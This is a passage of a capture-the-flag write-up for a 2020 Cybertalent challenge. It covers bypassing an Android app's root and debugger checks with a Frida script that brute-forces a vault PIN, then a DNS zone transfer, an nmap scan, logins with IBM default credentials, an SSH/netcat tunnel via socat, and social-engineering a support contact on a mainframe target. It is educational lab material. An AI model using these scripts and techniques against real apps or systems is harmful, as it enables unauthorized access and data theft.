    cls = new InMemoryDexClassLoader(t, getClassLoader()).loadClass("com.example.extra.extra");
    // --- snip ---
    method = cls.getMethod("getData", String.class);
    // --- snip ---
    return (byte[]) method.invoke(null, str);
}
```

* * *

##### `VaulActivity.finalize(byte[])`

`finalize` is a another native function, this time we use Ghidra to take a closer look at the function from the library that was extracted from the APK.

```java
public native byte[] finalize(byte[] bArr);
```

* * *

###### `libnative-lib.so`

We find that that the native method of `finalize` (`Java_no_cybertalent_liberatortoolkit_VaultActivity_finalize`) calls the static boolean method `CheckHelper.is(Context)`, and then checks if the `/proc/self/status` file contains `TracerPid: 0`, to finially return some result back to the caller. `TracerPid` returns the [PID of process tracing this process (0 if not being traced)](https://man7.org/linux/man-pages/man5/proc.5.html).

In other words this function seems to be doing additional checks that we need to bypass.

```c
// --- snip ---
uVar5 = _JNIEnv::CallObjectMethod((_jobject *)param_1,p_Var6,uVar5);
p_Var4 = (_jmethodID *)
       (**(code **)(*param_1 + 0x30))
                 (param_1,"no/cybertalent/liberatortoolkit/helpers/CheckHelper");
uVar7 = (**(code **)(*param_1 + 0x388))
                (param_1,p_Var4,&DAT_00100a92,"(Landroid/content/Context;)Z"); // DAT_00100a92 = "is"
cVar1 = _JNIEnv::CallStaticBooleanMethod((_jclass *)param_1,p_Var4,uVar7,uVar5);
// --- snip ---
__fd = __open_2("/proc/self/status",0);
// --- snip ---
```

* * *

##### `CheckHelper.is(Context)`

The `is` function simply returns `true` if it believes we have a rooted Android device by checking various known directories that a rooted Android device has access to.

```java
public class CheckHelper {
    public static boolean is(Context context) {
        String str = Build.TAGS;
        if (str != null && str.contains("test-keys")) {
            return true;
        }
        String string = context.getString(R.string.su);
        String[] strArr = {"/sbin/", "/system/bin/", "/system/xbin/", "/data/local/xbin/", "/data/local/bin/", "/system/sd/xbin/", "/system/bin/failsafe/", "/data/local/"};
        for (int i = 0; i < 8; i++) {
            if (new File(a.b(strArr[i], string)).exists()) {
                return true;
            }
        }
        return false;
    }
}
```

* * *

##### `c.a.a.d.a.b(File, File, byte[])`

When the correct PIN has been entered in `onLockerClick` it starts looping through all the encrypted files and calls this (`c.a.a.d.a.b`) function. We recall seeing this exact same function being used from the `TunerActivity` challenge, and therefore know that it is used to decrypt files, where the third argument (`byte[]`) is the key. In our case this key would be the SHA256 part of the TODO.

* * *

#### Solution flow

We now have everything we need to find the PIN and decrypt the files in the Vault. We can solve this challenge without running the application, but that is no fun. Our flow will be the following:

1.  Override the `CheckHelper.is(Context)` function to return `false`.
2.  Get an instance of `VaultActivity`.
3.  Loop through the numbers 0000 - 9999.
4.  Use the number as PIN and pass it into `VaulActivity.t(String)`
5.  Pass the result to `VaultActivity.finalize()`.
6.  Base 64 encode the first 16 bytes of the resultt and compare it to the `pin_hash` variable from the `SharedPreferences`.
7.  If it matches, stop the bruteforcing and print out the PIN.
8.  Input the PIN and unlock the Vault.

* * *

##### Automation

We now use [Frida](https://frida.re/) again to automate our solution flow. We could go even further with this script by launching the Vault view automatically, and executing the unlock, instead of just outputting the PIN.

###### [`frida-vault.js`](./2_oppdrag/1_beslag/3/frida-vault.js)

```js
const zeroPad = (num, places) => String(num).padStart(places, '0')
console.log("Loaded frida-vault.js");
setTimeout(function() {
  Java.perform(function () {
    // Override the `CheckHelper.is` function.
    var CheckHelper = Java.use("no.cybertalent.liberatortoolkit.helpers.CheckHelper");
    CheckHelper.is.implementation = function() {
      return false;
    }

    // For checking pin_hash
    var base64 = Java.use('android.util.Base64');

    // Find the VaultActivity
    Java.choose("no.cybertalent.liberatortoolkit.VaultActivity", {
      onMatch: function (instance) {
        console.log("Found VaultActivity object instance: " + instance);
        console.log("Starting bruteforce...");
        for (var i = 0; i <= 9999; i++) {
          let pin = zeroPad(i, 4);
          var t_result = instance.t(pin);
          var finalize_result = instance.finalize(t_result);

          var base = [];
          for (var a = 0; a < 16; a++) {
            base.push(finalize_result[a]);
          }
          var b64 = base64.encodeToString(base, 0).trim();
          if (b64 === "BSzN6uy2dDcolImpMKxffg==") {
            console.log("Found PIN:", pin);
            return;
          }
        }
      },
      onComplete: function () { }
    });
  });
}, 5000);
```

###### [`unlock_vault.py`](./2_oppdrag/1_beslag/3/unlock_vault.py)

```python
import frida
import sys

PACKAGE_NAME = "no.cybertalent.liberatortoolkit"

def on_message(message, data):
    print(message)


with open("frida-vault.js") as f:
    ss = f.read()

# Get our emulator
device = frida.get_usb_device()

# 1118  Liberator Toolkit 3000                  no.cybertalent.liberatortoolkit
pid = device.spawn([PACKAGE_NAME])
session = device.attach(pid)

script = session.create_script(ss)
script.on("message", on_message)
script.load()
device.resume(pid)
sys.stdin.read()
```

* * *

Executing the script and letting it run for a few seconds results with the PIN `5693`, and we can now open the various files.

```sh
$ python unlock_vault.py
Loaded frida-vault.js
Found VaultActivity object instance: no.cybertalent.liberatortoolkit.VaultActivity@d097244
Starting bruteforce...
Found PIN: 5693
```

* * *

###### Todo

```
Buy xmas presents
Find an xmas tree
Order airline tickets
```

###### Flag

```
d025828e7d38c133d3224154ae7785b344536761
```

###### Shopping list
```
1 Milk
1 Bread
6 Eggs
1000 rounds 7.76mm
10 HE grenades
4 Yoghurt
1 Butter
```

###### Important links

```
Hidden service URL:
http://fileserver/files/onion_name.txt
 
Scada client binary:
http://fileserver/files/082391170510954df0c28af1ebb9380a
Rembember this only works on the internal network, not from the outside.
```

* * *

```sh
login@corax:~$ scoreboard d025828e7d38c133d3224154ae7785b344536761
Kategori: 2. Oppdrag
Oppgave:  2.1_beslag_3
Svar:     d025828e7d38c133d3224154ae7785b344536761

Kanskje det ligger noen interessante filer her?
```












## [2.2_seatheworld](./2_oppdrag/2_seatheworld)

### [2.2_seatheworld](./2_oppdrag/2_seatheworld/1)

Continuing our investigation we start taking a look at the provided network traffic dump file `traffic_log_suspect_3577374.pcap`, and find DNS query requests done to a `ns1.seatheworld.tld` server.

After looking at the list of [DNS records](https://en.wikipedia.org/wiki/List_of_DNS_record_types) we attempt to perform a [DNS zone transfer (AXFR)](https://en.wikipedia.org/wiki/DNS_zone_transfer), resulting in the record `_flagg.nusse.seatheworld.tld`, we also take mental a note of the DNS record for `nusse.seatheworld.tld`.

```
login@corax:~$ dig @ns1.seatheworld.tld seatheworld.tld AXFR

; <<>> DiG 9.11.5-P4-5.1+deb10u2-Debian <<>> @ns1.seatheworld.tld seatheworld.tld AXFR
; (1 server found)
;; global options: +cmd
seatheworld.tld.	600	IN	SOA	ns1.seatheworld.tld. ns1.seatheworld.tld. 12345678 1200 180 1209600 600
seatheworld.tld.	600	IN	NS	ns1.seatheworld.tld.
seatheworld.tld.	600	IN	MX	10 mail.seatheworld.tld.
_flagg.nusse.seatheworld.tld. 600 IN	TXT	"03e5e4ecc1c8d69eff7f2de0a4367724"
mail.seatheworld.tld.	600	IN	CNAME	www.seatheworld.tld.
seatheworld.tld.	600	IN	A	203.0.113.12
nusse.seatheworld.tld.	600	IN	A	203.0.113.23
ns1.seatheworld.tld.	600	IN	A	10.0.74.76
www.seatheworld.tld.	600	IN	A	203.0.113.12
seatheworld.tld.	600	IN	SOA	ns1.seatheworld.tld. ns1.seatheworld.tld. 12345678 1200 180 1209600 600
;; Query time: 1 msec
;; SERVER: 10.0.74.76#53(10.0.74.76)
;; WHEN: Mon Dec 21 09:21:23 CET 2020
;; XFR size: 10 records (messages 1, bytes 450)
```

---

```sh
login@corax:~$ scoreboard 03e5e4ecc1c8d69eff7f2de0a4367724
Kategori: 2. Oppdrag
Oppgave:  2.2_seatheworld
Svar:     03e5e4ecc1c8d69eff7f2de0a4367724

Bra jobbet!
Hva kan det være denne maskinen brukes til?
```



### [2.2_seatheworld_aksess](./2_oppdrag/2_seatheworld/aksess)

We start by doing a nmap scan on the `nusse.seatheworld.tld` server and find references to `IBM OS/390 ftpd V1R10`, `IBM Telnet TN3270`, and `IBM httpd V5R3M0`.

```
Nmap scan report for 074767c25656ad47d4c9d6b079a1ff25_seatheworld-backend.1.vxf4eillwgyw89lqbie7usfq1.074767c25656ad47d4c9d6b079a1ff25_backend (10.0.74.78)
Host is up (0.0043s latency).
Scanned at 2020-12-21 11:48:24 CET for 1614s
Not shown: 65531 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     IBM OS/390 ftpd V1R10
| ssl-date: 
|_  ERROR: Unable to obtain data from the target
22/tcp open  ssh     OpenSSH 3.8.1p1 (protocol 2.0)
| ssh-hostkey: 
|   1024 fa:da:53:db:62:e3:70:27:aa:53:0c:6d:42:c5:61:e9 (DSA)
|_  1024 e0:24:b7:53:fe:b9:65:38:28:28:08:38:9b:da:66:7d (RSA)
23/tcp open  tn3270  IBM Telnet TN3270 (TN3270E)
80/tcp open  http    IBM httpd V5R3M0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: IBM HTTP Server/V5R3M0
|_http-title: IBM HTTP Server
Service Info: Host: FTPD1; OS: OS/390; CPE: cpe:/o:ibm:os_390
Final times for host: srtt: 4277 rttvar: 3817  to: 100000
```

---

#### 80/tcp - IBM httpd V5R3M0

We start by using `socat` to tunnel the traffic through SSH `socat TCP-LISTEN:1080,reuseaddr,fork "EXEC:ssh cybertalent nc nusse.seatheworld.tld 80"`. Another and a better solution to this is to use [sshuttle](https://github.com/sshuttle/sshuttle).

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/2_seatheworld/aksess/screenshots/15e511386ea54c99aa1641924279f984.png" width="300">

The **CONFIGURATION AND ADMINISTRATION FORMS** page used HTTP Basic authentication, we look for default IBM credentials and find the following [documentation](https://www.ibm.com/support/knowledgecenter/SSTQBD_12.0.1/com.ibm.zsys.rdt.guide.adcd.doc/topics/userids.html).

| User ID | Password |
| ------- | -------- |
| ADCDMST (RACF® special authority) | SYS1 or ADCDMST |
| IBMUSER (RACF special authority) | SYS1 or IBMUSER |
| SYSADM (DB2® and RACF special authority) | SYS1 or SYSADM |
| SYSOPR (DB2 and RACF special authority) | SYS1 or SYSOPR |
| ADCDA - ADCDZ | TEST |
| WEBADM | WEBADM |
| OPEN1 through OPEN3 | SYS1 |
| ZOSMFAD |	ZOSMFAD |

Testing the `WEBADM:WEBADM` credentials we successfully log in, but are prompted to change password, and do so.

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/2_seatheworld/aksess/screenshots/d18ac8392d894be980a5cf4e3f3382cf.png" width="300">

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/2_seatheworld/aksess/screenshots/cd7f71d1edc54e65b13a63da7b9ae90a.png" width="300">

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/2_seatheworld/aksess/screenshots/af7e75a746794876915e7a7c07e98e0f.png" width="300">

We are then welcomed with an administration application, however it requires NAPI to be enabled, and after spending a few hours setting up a Windows VM and installing various browsers (Netscape, IE6, ie.) we decide to give up and continue our enumeration of the other ports.


<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/2_seatheworld/aksess/screenshots/e4a910056e034295bc8a815f2fa091b4.png" width="300">

---

#### 21/tcp - IBM OS/390 ftpd V1R10

Continuing with the FTP server we successfully log in with `USER:USER`, and after some quick enumeration we find nothing of use.

```
login@corax:~$ ftp nusse.seatheworld.tld
Connected to nusse.seatheworld.tld.
220-FTPD1 IBM FTP CS V1R10 at NUSSE.SEATHEWORLD.TLD, 21:32:59 on 2020/12/19.
220 Connection will close if idle for more than 5 minutes.
Name (nusse.seatheworld.tld:login): USER
331 Send password please.
Password:
230 USER is logged on.  Working directory is "USER.".
Remote system type is MVS.
ftp> ls
227 Entering Passive Mode (10,0,50,68,179,25).
125 List started OK
Volume Unit    Referred Ext Used Recfm Lrecl BlkSz Dsorg Dsname
ZASYS1 3390   2020/12/16  1   10  FB      80 23440  PO  CLIST
ZAIMS1 3390   2008/10/30  1 1500  U    32760 32760  PO  IMS1010.MLPA
ZASYS1 3390   2020/12/14  1    2  FB      80  3120  PO  ISPF.ISPPROF
ZASYS1 3390   2020/12/14  1   10  FB      80 23440  PO  ISPPLIB
ZASYS1 3390   2020/12/19  1   10  U     6144  6144  PO  LINKLIB
ZASYS1 3390   **NONE**    1   10  U    32760 32760  PO  LPALIB
ZASYS1 3390   2020/12/19  1   30  FB      80 23440  PO  PARMLIB
ZASYS1 3390   2020/12/19  1   10  FB      80  9040  PO  PROCLIB
ZASYS1 3390   **NONE**    1   10  FB      80 23440  PO  VTAM.SOURCE
ZASYS1 3390   2020/12/19  1   10  U    32760 32760  PO  VTAMLIB
ZASYS1 3390   2020/12/19  1   10  FB      80 23440  PO  VTAMLST
ZASYS1 3390   **NONE**    1   10  FB      80 27920  PO  WLM.INPUT
250 List completed successfully.
ftp>
```

```
ftp> ls /
227 Entering Passive Mode (10,0,50,68,170,135).
125 List started OK
total 50
lrwxrwxrwx   1 START2   SYS1           9 Oct 28  2008 $SYSNAME -> $SYSNAME/
lrwxrwxrwx   1 START2   SYS1           9 Oct 28  2008 $VERSION -> $VERSION/
drwxr-xr-x   6 START2   SYS1        8192 Oct 28  2008 ADCD
drwxr-xr-x  11 START2   SYS1         736 Oct 16  2008 Z110
lrwxrwxrwx   1 START2   SYS1          12 Oct 28  2008 bin -> $VERSION/bin
lrwxrwxrwx   1 START2   SYS1          12 Oct 28  2008 dev -> $SYSNAME/dev
lrwxrwxrwx   1 START2   SYS1          12 Oct 28  2008 etc -> $SYSNAME/etc
lrwxrwxrwx   1 START2   SYS1          12 Oct 28  2008 lib -> $VERSION/lib
lrwxrwxrwx   1 START2   SYS1          12 Oct 28  2008 opt -> $VERSION/opt
lrwxrwxrwx   1 START2   SYS1          16 Oct 28  2008 samples -> $VERSION/samples
lrwxrwxrwx   1 START2   SYS1          12 Oct 28  2008 tmp -> $SYSNAME/tmp
drwxr-xr-x  11 START2   SYS1        8192 Dec 14 22:39 u
lrwxrwxrwx   1 START2   SYS1          12 Oct 28  2008 usr -> $VERSION/usr
lrwxrwxrwx   1 START2   SYS1          12 Oct 28  2008 var -> $SYSNAME/var
drwxr-xr-x   3 START2   SYS1        8192 May  3  2000 web
250 List completed successfully.
```

---

#### 22/tcp - OpenSSH 3.8.1p1 (protocol 2.0)

Attempting to log in to SSH with the `user:user` credentials we are given an error, and decide to continue with the telnet port instead.
```
login@corax:~$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 user@nusse.seatheworld.tld
user@nusse.seatheworld.tld's password:
22: FSUM7351 not found
```

---

#### 23/tcp - IBM Telnet TN3270 (TN3270E)

> The [IBM 3270](https://en.wikipedia.org/wiki/IBM_3270) is a family of block oriented display and printer computer terminals introduced by IBM in 1971 and normally used to communicate with IBM mainframes.

And after reading up on the official [introduction](https://www.ibm.com/support/knowledgecenter/zosbasics/com.ibm.zos.znetwork/znetwork_261.htm) and some [documentation](
https://www.ibm.com/ru/software/info/students/zm9/zcontest1.pdf) we find [x3270](http://x3270.bgp.nu/):

> x3270 is an IBM 3270 terminal emulator for the X Window System and Windows. It runs on most Unix-like operating systems -- e.g., Linux, Mac OS X, Solaris and Cygwin. It also runs natively on Windows. 

We also find 3270 related commands installed on the `corax` host.
```sh
login@corax:~$ x3270if
usage:
 x3270if [options] "action[(param[,...])]"
   execute the named action
 x3270if [options] -s field
   display status field 0..12
 x3270if [options] -S
   display all status fields
 x3270if [options] -i
   shuttle commands and responses between stdin/stdout and emulator
options:
 -v       verbose operation
 -p pid   connect to process <pid>
 -t port  connect to TCP port <port>
```

After installing x3270 locally, we connect to the telnet port that we have proxied through `socat`.

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/2_seatheworld/aksess/screenshots/6aeef77b6f344fd2b054f784479a143f.png" width="300">

`localhost` does not work, so `127.0.0.1` had to be used instead. After connecting we are presented with a developer image of the IBM mainframe operating system [z/OS](https://www.ibm.com/support/knowledgecenter/zosbasics/com.ibm.zos.zmainframe/zconc_opsyszosintro.htm). We take a note of the `LOGON` command example (`LOGON IBMUSER`).

---

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/2_seatheworld/aksess/screenshots/6de1406078d54e97be4cd95d622b198b.png" width="300">

Entering `LOGON` we are presented with the `TSO/E LOGON` view.

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/2_seatheworld/aksess/screenshots/5b13118bac2741d5a72b0b8382958f19.png" width="300">

With the hint from the initial page (`LOGON IBMUSER`), we recall the [documentation](https://www.ibm.com/support/knowledgecenter/SSTQBD_12.0.1/com.ibm.zsys.rdt.guide.adcd.doc/topics/userids.html) containing default credentials and enter `IBMUSER:SYS1` and get the first flag.

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/2_seatheworld/aksess/screenshots/c98ebc2593b84f37b5dcbcecf5681968.png" width="300">

---

```sh
login@corax:~$ scoreboard RETRO_IS_THE_NEW_MODERN
Kategori: 2. Oppdrag
Oppgave:  2.2_seatheworld_aksess
Svar:     RETRO_IS_THE_NEW_MODERN

Navn på gisseltakerne burde være tilgjengelig et sted på denne stormaskinen.
```


### [2.2_seatheworld_booking](./2_oppdrag/2_seatheworld/booking)

From the first view we get information on how to load the application.

```
START BOOKING APPLICATION (IBMUSER ONLY):
LOAD IBMUSER.SEATW.LOAD(BOOKING)
```

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/2_seatheworld/booking/screenshots/8a8d4fd95c4542009d56869b7e3b4a31.png" width="300">

We recall seeing a booking reference code from seized chat log from `07 DES 2020`: `WJWQX`.

```
--- Day changed 07 DES 2020 ---

[08:27] hungry_hippo_123: btw can't find my booking reference
[09:02] RADAR: Hey full radio silence NEWB
[09:44] B4tCracK: nah its fine.
[09:47] hungry_hippo_123: Do I need the reference thingy??
[10:14] B4tCracK: ive examined the traffic pcaps and the app is safe
[10:48] hungry_hippo_123:  <overly_attached_norwegian.jpg >
[11:26] B4tCracK: and duh, yeah, you need the reference. i got it here two secs
[12:08] B4tCracK: WJWQX
[13:20] hungry_hippo_123: <leo_dicaprio_thank_you.jpeg>
[13:37] RADAR: Hey b4tCracK: while you checked the traffic, did you check that travel system, too?
[13:38] eireen89: Everyone ready for tomorrow?
[14:05] hungry_hippo_123:  <distractedBoyfriend_Antarctica.png >
[14:56] B4tCracK: yeah, some old crap that system
[14:56] B4tCracK: good thing for us
```

Entering the booking reference code we are given information regarding `Frank Shorius`'s booking.

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/2_seatheworld/booking/screenshots/d79a39aa11a64fd2bfcff18e7d122b58.png" width="300">

The system does not allow searching through older bookings, so I attempted to write a bruteforce script (see below) without luck. Looking back to the first view, we recall seeing a Skype contact address and attempt to do some _social engineering_.

```
SKYPE CONTACT ADDRESS:
LIVE:.CID.8F97B1C571970F8C
```
---

#### Social engineering

Adding the ID we are welcomed by a tech support person. We tell them that we lost the other booking references and simply ask them for the other names.

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/2_seatheworld/booking/screenshots/a8b5a71800e94e8390a31cda10fd512e.png" width="500">
<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/2_seatheworld/booking/screenshots/ab55fd619c3441f8a47459391c5d9791.png" width="500">
<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/2_seatheworld/booking/screenshots/2be2a9b3c7c446eb8c26ac3d95ca95e8.png" width="500">
<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/2_seatheworld/booking/screenshots/65ec4da2266f404384969aa6ba3f1724.png" width="500">
<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/2_seatheworld/booking/screenshots/68e6d539ad894a728d7659076cfc6fa3.png" width="500">

```
Øvrige navn på den bookingen er:

Joe Farnaby
Eireen Farnaby
Dillian Cruise

Det er ingen flere reservasjonsnummer tilknyttet denne reisen. 
```
---

#### Other bookings

We use the provided names to find the other bookings to see if we find any other useful information, and finially submitting one of the names as a flag.

```
 ###             SEA THE WORLD BOOKING SYSTEM           ###
 ##########################################################
 1) DISPLAY BOOKING CODE              4) CREATE NEW BOOKING
 2) DISPLAY BOOKING BY NAME           
 3) DISPLAY BOOKING BY DATE           0) EXIT
 SELECT ACTION: 
2
 INPUT NAME (FIRST LAST): 
JOE FARNABY
 SEARCHING FOR TRAVELS BY JOE FARNABY...
  
 BOOKING: WTHHX                   NAME: JOE FARNABY 
 JOURNEY: AMS 2020-12-14 18:20    TXA 2020-12-14 22:40
 **********************************************************
   FOUND 1 RECORDS 
```

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/2_seatheworld/booking/screenshots/d6b9f0f6876f402d898f432077a622cc.png" width="300">

```
 BOOKING: DY6MY                   NAME: EIREEN FARNABY 
 JOURNEY: AMS 2020-12-14 18:20    TXA 2020-12-14 22:40
```

```
 BOOKING: UHKVP                   NAME: DILLIAN CRUISE
 JOURNEY: AMS 2020-12-14 18:20    TXA 2020-12-14 22:40
```

---

```sh
login@corax:~$ scoreboard joe farnaby
Kategori: 2. Oppdrag
Oppgave:  2.2_seatheworld_booking
Svar:     joe farnaby

Bra jobbet med å identifisere gisseltakerene!
Mon tro om vi hadde fått enda mer ut av en teknisk tilgang også?
```

---

#### Bruteforce

After attempting to find the booking reference codes / names on the system without luck, we attempt to bruteforce the reference codes for fun (without luck of course) with [py3270](https://pypi.org/project/py3270/).

You can find the bruteforcer [here](./9000_madness/2_seatheworld_bookings_bruteforcer).

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/2_seatheworld/booking/screenshots/ec55a1a099714a3d82164be6cb3cfc3d.gif" width="400">






### [2.2_seatheworld_ekstra](./2_oppdrag/2_seatheworld/ekstra)

We read up on the offical [documentation](https://www.ibm.com/support/knowledgecenter/SSLTBW) of the IBM mainframe given in the first view. We are also given a list of useful commands, and take a special note of `ISPF` and `SUBMIT`.

```
 ***************************************************************** 
 *  USEFUL COMMANDS:                                             *
 *  ----------  --------------------------                       *
 *  CTRL-A 1    - CANCEL CURRENT COMMAND                         *
 *  ISPF        - LOAD ISPF                                      *
 *  HELP        - LIST MORE USEFUL COMMANDS                      *
 *  ALLOCATE    - ALLOCATE DATA SET                              *
 *  EDIT        - EDIT DATA SET                                  *
 *  LISTC       - LIST DATA SET                                  *
 *  LOAD        - LOAD DATA SET                                  *
 *  SUBMIT      - SUBMIT BATCH JOB                               *
 *****************************************************************
```

---

#### LISTC
Listing the data sets we find the following data sets under ``IBMUSER.SEATW``:

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/2_seatheworld/booking/screenshots/77dab66b0c3b4540a6e2cd51a8c26e9f.png" width="300">

---

#### ISPF

> [ISPF](https://www.ibm.com/support/knowledgecenter/zosbasics/com.ibm.zos.zconcepts/zconc_whatisispf.htm) is a full panel application navigated by keyboard. ISPF includes a text editor and browser, and functions for locating and listing files and performing other utility functions. 

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/2_seatheworld/booking/screenshots/aa2a33f3b56940b8bfdd310a8e93251f.png" width="300">

Looking further into the **VIEW** option and its documentation/tutorial:

```
 TUTORIAL -------------------------- VIEW ----------------------------- TUTORIAL
 OPTION  ===>                                                                  
                                                                               
                                                                                
                      -----------------------------------                       
                      |             VIEW                |                       
                      -----------------------------------                       
                                                                                
   View allows you to display source data or output listings.  With View,       
   members of partitioned data sets, DASD-resident sequential data sets,        
   or z/OS UNIX files can be displayed, and updated using Edit primary          
   and line commands.  Changes to data are not saved.                           
                                                                                
   Browse also allows you to display data or output listings.  With             
   Browse, members of partitioned data sets, DASD-resident sequential           
   data sets, or z/OS UNXI files can be displayed, and can be scrolled          
   forward, backward, left, or right.  Browse can be selected from the          
   View Entry Panel.                                                            
                                                                                
 The following topics are presented in sequence, or may be selected by number:  
   0 - General introduction              2 - SCLM View entry panel              
   1 - View entry panel                  3 - Ending a view session              
 The following topics will be presented only if selected by number:             
   4 - Using View                                                               
   5 - Using Browse                                                             

```
---

#### `IBMUSER.SEATW.SRC`

Knowing that we can view the data sets, we take a closer look at the `IBMUSER.SEATW.SRC` data set, and find 3 files, `C`, `CIPHER`, and `JCL`.

```
   Menu  RefList  RefMode  Utilities  Workstation  Help                         
 ────────────────────────────────────────────────────────────────────────────── 
                                View Entry Panel                               
 Command ===>                                                                  
                                                                               
 ISPF Library:                                                                 
    Project . . . IBMUSER                                                       
    Group . . . . SEATW    . . .          . . .          . . .                  
    Type  . . . . SRC                                                           
    Member  . . .                 (Blank or pattern for member selection list)  
                                                                                
 Other Partitioned, Sequential or VSAM Data Set, or z/OS UNIX file:            
    Name . . . . .                                                            +
    Volume Serial . .           (If not cataloged)                              
                                                                                
 Workstation File:                                                             
    File Name  . .                                                              
                                         Options
 Initial Macro  . . . .                     Confirm Cancel/Move/Replace        
 Profile Name . . . . .                     Browse Mode                        
 Format Name  . . . . .                     View on Workstation                
 Data Set Password  . .                  /  Warn on First Data Change          
 Record Length  . . . .                     Mixed Mode                         
                                            View ASCII data                    
```

```
   Menu  Functions  Utilities  Help                                             
 ────────────────────────────────────────────────────────────────────────────── 
 VIEW     IBMUSER.SEATW.SRC                                  Row 00001 of 00003
 Command ===>                                                  Scroll ===> PAGE
    Name     Prompt          Size    Created           Changed            ID   
 . C                          327   2020/12/08   2020/12/16 12:47:42    IBMUSER 
 . CIPHER                       1   2020/12/09   2020/12/09 08:35:48    IBMUSER 
 . JCL                          6   2020/12/08   2020/12/14 22:41:25    IBMUSER 
   **End**                                                                      
```

We input `SELECT C` (a copy of the source code can be found [here](./9000_madness/2_seatheworld_data_set_downloader/datasets/IBMUSER.SEATW.SRC(C))) and find the source code of the booking application. Most interesting is the `SKIP_FLAG` definition on line #5 and the IF statement on line #317 that stops the `print_flag()` function from executing.

```c
000005 #define SKIP_FLAG 1
// --- snip ---
000313 main(int argc, char **argv) 
000314 { 
000315     int tries = 0; 
000316                                                                     
000317     if (SKIP_FLAG) 
000318         printf( 
000319             "\n***********************************************" 
000320             "\n FLAG: NOT PRINTING DUE TO COMPILE TIME OPTION" 
000321             "\n***********************************************\n\n"); 
000322     else 
000323         print_flag(); 
000324                                                                     
000325     while (main_menu() && tries++ < 200) 
000326         ; 
000327 } 
```

We also dump the other data sets, you can find them [here](./9000_madness/2_seatheworld_data_set_downloader/datasets).

---

#### EDIT

We now want to change the value of `SKIP_FLAG` to `0` so that the `print_flag()` is executed. We go back to the ISPF menu and use the same method as previously, but with the `VIEW` command this time, and edit the source file, replacing `1` with a `0`: `#define SKIP_FLAG 0`

---

#### SUBMIT

Now we need to compile this, and go back to the main menu and execute the `SUBMIT` and provide the [Job control language (JCL)](https://www.ibm.com/support/knowledgecenter/zosbasics/com.ibm.zos.zjcl/zjclc_basicjclconcepts.htm) file to compile the application.
> Job control language (JCL) is a set of statements that you code to tell the z/OS® operating system about the work you want it to perform. Although this set of statements is quite large, most jobs can be run using a very small subset. Learn about essential and most frequently used JCL statements and parameters, as well as coding techniques.
> 
```
SUBMIT IBMUSER.SEATW.SRC(JCL)
 IKJ56250I JOB STWCOMPL(JOB01125) SUBMITTED
 READY
```

---

#### Flag
Loading the application again gives us the final flag.

```
LOAD IBMUSER.SEATW.LOAD(BOOKING) 
 ***********************************************
  FLAG: c0da14705d803523d572a0480a51d61c
 ***********************************************
```

---

```
login@corax:~$ scoreboard c0da14705d803523d572a0480a51d61c
Kategori: 2. Oppdrag
Oppgave:  2.2_seatheworld_ekstra
Svar:     c0da14705d803523d572a0480a51d61c

Gratulerer! Du har utvist grunnleggende kunnskap om IBM stormaskiner.
Det er behov for kunnskap om en rekke forskjellige systemer i en jobb hos oss,
og evnen til å sette seg inn i nye (og gamle!) ting er viktig.

En stor takk til IBM Norge som lot oss benytte z/OS for årets CTF!
```

---

#### Data set downloader
There is a way to download the data sets in the mainframe through the UNIX shell, we therefore create a [data set downloader](./9000_madness/2_seatheworld_data_set_downloader/download_datasets.py) data connects to the host through SSH and transfers the data sets from the main frame, to the host, and finally to localhost. More information regarding copying files can be found [here](https://www.ibm.com/support/knowledgecenter/SSLTBW_2.4.0/com.ibm.zos.v2r4.bpxa400/cpfilemem.htm).

```
IBMUSER:/u/ibmuser >cp "//'ibmuser.seatw.src(c)'" example
IBMUSER:/u/ibmuser >cat example | head
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
```

---

#### Analyzing the bookings
Now that we have a data set downloader, we use it to download the `BOOKING` data set, the script can be found [here](./9000_madness/2_seatheworld_bookings_parser/parse_bookings.py).

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/2_seatheworld/booking/screenshots/7430b4b8e93b4bc2a9d68cea3ba1eb6e.png" width="300">






